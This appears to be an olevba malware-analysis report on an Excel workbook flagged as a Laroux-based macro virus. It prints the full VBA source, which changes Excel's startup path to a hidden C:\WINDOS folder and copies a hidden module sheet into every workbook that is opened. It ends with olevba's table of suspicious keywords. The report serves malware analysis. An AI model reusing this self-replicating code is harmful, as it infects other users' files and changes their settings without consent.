olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-fc5d0c4cd83f96006122cb425723bd2054b05c20
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO lalala.bas 
in file: Virus.MSExcel.Laroux-based-fc5d0c4cd83f96006122cb425723bd2054b05c20 - OLE stream: '_VBA_PROJECT_CUR/VBA/lalala'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "check_files"
End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    X$ = Dir("C:\WINDOS", 16)
    If X$ = "WINDOS" Then
        If Application.AltStartupPath = "C:\WINDOS" Then
        
        Else: Application.AltStartupPath = "C:\WINDOS"
        End If
    Else
      NEWDIR$ = "C:\WINDOS"
      MkDir NEWDIR$
      Application.AltStartupPath = "C:\WINDOS"
    End If
    c$ = Application.AltStartupPath
    m$ = Dir(c$ & "\" & "WINDOS.XLS")
    If m$ = "WINDOS.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("lalala").Visible = True
    Sheets("lalala").Select
    Sheets("lalala").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.AltStartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs Filename:=Application.AltStartupPath & "/" & "WINDOS.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("lalala").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "windos.xls!check_files"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "lalala" Then
        Workbooks("WINDOS.XLS").Sheets("lalala").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("lalala").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "WINDOS.xls!check_files"
    Case Else
End Select
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  lalal
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Application.AltStart|May change which directory contains files to |
|          |upPath              |open at startup                              |
+----------+--------------------+---------------------------------------------+

